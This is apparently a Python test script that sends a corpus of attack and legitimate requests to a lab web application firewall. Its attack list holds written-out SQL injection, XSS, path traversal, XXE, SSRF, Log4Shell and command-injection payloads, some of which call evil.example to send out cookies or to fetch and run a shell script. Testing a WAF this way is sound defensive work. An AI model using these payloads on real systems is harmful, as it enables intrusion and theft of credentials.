"""Attack and legitimate requests used to check and tune the WAF.

    python tests/waf_corpus.py --base https://localhost:8440 --ca .secrets/pki/ca.crt

Each case says what the edge must answer: blocked (403, or 415 for the API contract) or allowed (200).
The legitimate cases are the important half: a WAF that blocks real customers gets switched off.
tests/test_edge.py runs every case against the lab; this script prints a summary table.
"""

import argparse
import sys
from dataclasses import dataclass, field

import requests

JSON = {"Content-Type": "application/json"}


@dataclass
class Case:
    name: str
    category: str
    method: str
    path: str
    expect: int
    params: dict | None = None
    json: dict | None = None
    data: str | None = None
    headers: dict = field(default_factory=dict)


ATTACKS = [
    # SQL injection
    Case("SQLi tautology", "sqli", "GET", "/api/search", 403, params={"q": "1' OR '1'='1' --"}),
    Case("SQLi UNION", "sqli", "GET", "/api/search", 403, params={"q": "x' UNION SELECT username, password FROM users--"}),
    Case("SQLi time-based", "sqli", "GET", "/api/orders", 403, params={"id": "1; SELECT pg_sleep(5)--"}),
    Case("SQLi in JSON body", "sqli", "POST", "/api/login", 403, json={"username": "admin'--", "password": "x' OR 1=1--"}),
    # Cross-site scripting
    Case("XSS script tag", "xss", "GET", "/api/search", 403, params={"q": "<script>alert(document.cookie)</script>"}),
    Case("XSS event handler", "xss", "GET", "/api/search", 403, params={"q": '"><img src=x onerror=alert(1)>'}),
    Case("XSS in JSON comment", "xss", "POST", "/api/comments", 403, json={"text": "<svg/onload=fetch('//evil.example/'+document.cookie)>"}),
    # Path traversal / local file inclusion
    Case("Path traversal", "lfi", "GET", "/api/files", 403, params={"name": "../../../../etc/passwd"}),
    # nginx itself rejects this one with 400 before the WAF sees it: blocked either way.
    Case("Encoded traversal", "lfi", "GET", "/static/..%2f..%2f..%2fetc%2fshadow", 400),
    # Remote command execution
    Case("Shell command", "rce", "GET", "/api/ping", 403, params={"host": "127.0.0.1; cat /etc/passwd"}),
    Case("Command substitution", "rce", "POST", "/api/comments", 403, json={"text": "$(curl http://evil.example/x.sh | sh)"}),
    Case("Log4Shell", "rce", "GET", "/", 403, headers={"User-Agent": "${jndi:ldap://evil.example/a}"}),
    # Server-side request forgery
    Case("SSRF cloud metadata", "ssrf", "GET", "/api/fetch", 403, params={"url": "http://169.254.169.254/latest/meta-data/iam/"}),
    # XML external entity (local rule 10030, found missing with GoTestWAF)
    Case("XXE in an XML body", "xxe", "POST", "/import", 403, headers={"Content-Type": "application/xml"},
         data='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
    # PHP and Java
    Case("PHP code injection", "php", "GET", "/api/search", 403, params={"q": "<?php system($_GET['c']); ?>"}),
    Case("Java deserialization gadget", "java", "POST", "/api/comments", 403, json={"text": "java.lang.Runtime.getRuntime().exec('id')"}),
    # Reconnaissance
    Case("Scanner user agent", "scanner", "GET", "/", 403, headers={"User-Agent": "sqlmap/1.8.2#stable (https://sqlmap.org)"}),
    Case("Git folder", "recon", "GET", "/.git/config", 403),
    Case("Env file", "recon", "GET", "/.env", 403),
    # Local rules (custom-rules.conf)
    Case("Virtual patch: actuator", "local", "GET", "/actuator/env", 403),
    Case("API write without JSON", "local", "POST", "/api/comments", 415, data="text=hello", headers={"Content-Type": "application/x-www-form-urlencoded"}),
    # Protocol
    Case("Method not allowed", "protocol", "DELETE", "/api/orders/1", 403),
]

LEGITIMATE = [
    Case("Home page", "page", "GET", "/", 200),
    Case("Stylesheet", "page", "GET", "/static/app.css", 200),
    Case("Product search", "search", "GET", "/api/search", 200, params={"q": "wireless headphones"}),
    Case("Name with apostrophe", "search", "GET", "/api/search", 200, params={"q": "O'Brien"}),
    Case("Words that look like SQL", "search", "GET", "/api/search", 200, params={"q": "select the best laptop for gaming and work"}),
    Case("Ampersand and quotes", "search", "GET", "/api/search", 200, params={"q": 'rock & roll "greatest hits"'}),
    Case("Sorting and paging", "api", "GET", "/api/orders", 200, params={"sort": "-created_at", "page": "2", "per_page": "50"}),
    Case("Login with a strong password", "api", "POST", "/api/login", 200, json={"username": "alice", "password": "Tr0ub4dor&3';--Horse!"}),
    Case("Comment with punctuation", "api", "POST", "/api/comments", 200, json={"text": "Great product! I'd buy it again; 5/5 :) -- Sam"}),
    Case("Comment about drop-down menus", "api", "POST", "/api/comments", 200, json={"text": "Please update the drop-down menu, then delete the old one from the table."}),
    Case("Profile with an e-mail and a URL", "api", "POST", "/api/profile", 200, json={"email": "alice@example.com", "website": "https://example.com/about?ref=home"}),
    Case("Browser-like headers", "page", "GET", "/", 200, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
    }),
]


def send(base: str, case: Case, verify, session: requests.Session | None = None) -> requests.Response:
    http = session or requests
    headers = dict(case.headers)
    if case.json is not None:
        headers.update(JSON)
    return http.request(
        case.method, base + case.path, params=case.params, json=case.json, data=case.data,
        headers=headers, verify=verify, timeout=10, allow_redirects=False,
    )


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="https://localhost:8440")
    parser.add_argument("--ca", default=".secrets/pki/ca.crt", help="CA file, or 'none' for plain HTTP")
    args = parser.parse_args()
    verify = False if args.ca == "none" else args.ca

    failures = 0
    for title, cases in (("Attacks (must be blocked)", ATTACKS), ("Legitimate traffic (must pass)", LEGITIMATE)):
        print(f"\n{title}")
        for case in cases:
            r = send(args.base, case, verify)
            ok = r.status_code == case.expect
            failures += not ok
            print(f"  {'OK ' if ok else 'BAD'} {r.status_code} (want {case.expect})  [{case.category}] {case.name}"
                  f"  request-id={r.headers.get('X-Request-ID', '-')}")
    blocked = sum(1 for c in ATTACKS if send(args.base, c, verify).status_code == c.expect)
    passed = sum(1 for c in LEGITIMATE if send(args.base, c, verify).status_code == c.expect)
    print(f"\nAttacks blocked: {blocked}/{len(ATTACKS)}   Legitimate requests allowed: {passed}/{len(LEGITIMATE)}")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
